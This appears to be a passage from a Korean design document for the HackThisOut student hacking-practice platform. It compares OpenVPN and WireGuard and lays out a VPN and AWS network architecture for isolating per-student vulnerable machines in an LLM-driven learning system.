> HackThisOut처럼 불특정 다수의 학생이 개인 PC에서 접속하는 구조에는
> **OpenVPN과 WireGuard만이 실질적으로 맞는 선택**이다.


### Hack This Out 관점 장단점

**OpenVPN 장점:**
```
✅ 기존 1.0/2.0 코드 재활용 가능 (generateVPNProfile.ts)
✅ 표준 CRL revoke → 세션 종료 시 즉각 차단 용이
✅ HTB 레퍼런스 그대로 적용 가능
✅ 레퍼런스/문서 풍부 → 학습 비용 낮음
✅ CRL로 다수 사용자 일괄 관리 가능
```

**OpenVPN 단점:**
```
❌ TLS Handshake로 초기 연결 느림
❌ Easy-RSA PKI 인프라 관리 필요
❌ 설정 파일(.ovpn)이 상대적으로 복잡
❌ 코드베이스 방대 → 잠재적 취약점 가능성
```

**WireGuard 장점:**
```
✅ 연결 속도 빠름 → 아레나/학습 세션 시작 시 빠른 연결
✅ 설정 간단 → 구현 및 유지보수 쉬움
✅ PKI 인프라 불필요 → 관리 오버헤드 감소
✅ 커널 내장 → AWS EC2 성능 최적화
✅ 최신 암호화 (ChaCha20) → 보안성 우수
✅ 코드 적어 보안 감사 용이
```

**WireGuard 단점:**
```
❌ 표준 revoke 메커니즘 없음 → 별도 구현 필요
❌ 기존 코드베이스와 호환성 없음 → 재개발 필요
❌ 레퍼런스가 OpenVPN보다 적음
```

## 10. 3.0을 위한 VPN 전략

### 3.0의 특성과 VPN 요구사항

```
2.0 (아레나 경쟁):
- 다수 사용자가 동시에 머신 접속
- 아레나 시작/종료 시 VPN 권한 on/off
- 실시간 경쟁 → 연결 안정성 중요

3.0 (백준 스타일 학습 시스템):
- 개인 학습 중심 → 개별 세션 관리
- LLM이 문제 생성 → 문제별 머신 자동 생성
- 전 학과 학생 대상 → 대규모 동시 접속 가능
- 문제 제출 = 세션 종료 → VPN 자동 차단 연동
- 난이도 조절 → 머신 유형 다양화 → VPN 격리 더 중요
```

### 2.0 vs 3.0 VPN 구조 비교

| 구분 | 2.0 (아레나 경쟁) | 3.0 (학습 시스템) |
|------|-----------------|-----------------|
| 주요 목적 | 실시간 경쟁 | 개인 학습/문제풀이 |
| VPN 연결 트리거 | 아레나 참가 시 | 문제 시작 시 |
| VPN 해제 트리거 | 아레나 종료 시 | 문제 제출/포기 시 |
| 동시 접속 규모 | 아레나 참가자 수 | 전 학과 학생 수 |
| 머신 관리 | 아레나별 공유 머신 | 사용자별 개별 머신 |
| LLM 연동 | 일부 (AI 문제 생성) | 핵심 (전체 문제은행) |
| VPN 자동화 필요성 | 중간 | 매우 높음 |

### 3.0 권장 VPN 전략

```
핵심 인프라: OpenVPN 유지
이유:
  - 2.0 코드베이스 재활용 가능
  - CRL 기반 자동 revoke → 문제 제출 시 자동 연동
  - 검증된 안정성 → 전 학과 학생 대상 서비스에 적합

추가 고려: WireGuard 병행 제공
이유:
  - 대규모 동시 접속 시 서버 부하 감소
  - 연결 속도 빠름 → 학습 시작 대기시간 최소화
  - HTB처럼 사용자가 선택 가능하게 제공

3.0 자동화 필수 구현:
  1. 문제 시작    → EC2 생성 + VPN 프로파일 자동 발급
  2. 문제 제출    → VPN 자동 revoke + EC2 종료
  3. 시간 초과    → VPN 강제 차단 + EC2 종료
  4. 난이도 조절  → 머신 유형별 VPN 격리 정책 분리
```

### 3.0 전체 흐름

```
학생이 문제 선택
    ↓
LLM이 난이도/유형에 맞는 문제 생성
    ↓
AWS EC2에 취약 머신 자동 생성 (스냅샷 기반)
    ↓
generateVPNProfile.ts → .ovpn 자동 발급
    ↓
학생이 VPN 연결 → 머신 접속 → 문제 풀이
    ↓
플래그 발견 → 플랫폼에 제출
    ↓
LLM이 제출 답안 채점
    ↓
VPN 자동 revoke + EC2 종료 + EXP/코인 지급
```

## 11. 전체 구조 종합

### 전체 인프라 구조

```
[학생 PC]
    │ HTTPS (웹/학습 접속)
    │ UDP 1194 (OpenVPN)
    ▼
[인터넷]
    │
    ▼
[AWS VPC]
    │
    ├─[Public Subnet]────────────────────────────
    │   ├── EC2: VPN 서버 (OpenVPN, UDP 1194)
    │   ├── EC2: Backend (Express/Node.js)
    │   │         └── Anthropic Claude SDK (3.0)
    │   └── EC2: Frontend (React)
    │
    ├─[Private Subnet]───────────────────────────
    │   ├── EC2: Target Machine 1 (2.0 아레나용)
    │   ├── EC2: Target Machine 2 (3.0 학습 문제용)
    │   ├── EC2: Target Machine N (LLM 자동 생성)
    │   └── MongoDB
    │
    └─[S3]───────────────────────────────────────
        ├── 머신 AMI 스냅샷 (문제 유형별 관리)
        └── 정적 파일, 증거 파일 (Forensics용)
```

### 핵심 3가지 요약

```
PKI
→ "누가 접속하는가"를 인증서로 증명
→ CA가 신뢰의 근거, 인증서가 신분증
→ CRL Revoke로 세션 종료 시 즉각 접근 차단

라우팅
→ "어디로 갈 수 있는가"를 경로로 제어
→ Split Tunnel로 머신 트래픽만 VPN 경유
→ client-config-dir로 사용자별 머신 격리

AWS VPC
→ "어떤 환경에 있는가"를 네트워크로 격리
→ Public/Private Subnet으로 공격 표면 최소화
→ Security Group으로 인스턴스별 방화벽 적용
```

> 세 가지가 겹겹이 쌓여 HackThisOut의 보안 인프라를 구성한다.
> VPN은 단순한 네트워크 도구가 아닌 **HackThisOut 전체 플랫폼의 보안 인프라 기반**이며,
> 3.0에서는 LLM 기반 문제 생성/채점 시스템과 연동되어 **학습 세션 전체를 제어하는 핵심 인프라**가 된다.
